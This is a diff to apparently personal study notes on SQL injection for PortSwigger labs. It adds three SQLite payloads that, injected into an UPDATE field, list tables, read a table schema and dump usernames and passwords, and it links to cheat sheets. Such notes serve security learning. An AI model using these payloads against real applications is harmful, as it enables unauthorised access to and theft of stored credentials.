@@ -14,6 +14,13 @@ END;`
   * MySQL 	`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') `
 
 
+### Extra
+* `',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='` 
+
+* `',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='`
+
+* `',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='`
+
 ### Portswigger Lab Solution
 
 ************Lab 1:************
@@ -98,4 +105,7 @@ https://www.youtube.com/watch?v=LBG_n9fr8sM
 
 Use “Response Received” column from intruder and use it to sort the characters that took the most time
 
-https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+## CheatSheets
+* [Portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+* [Advanced SQL Injection](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet)
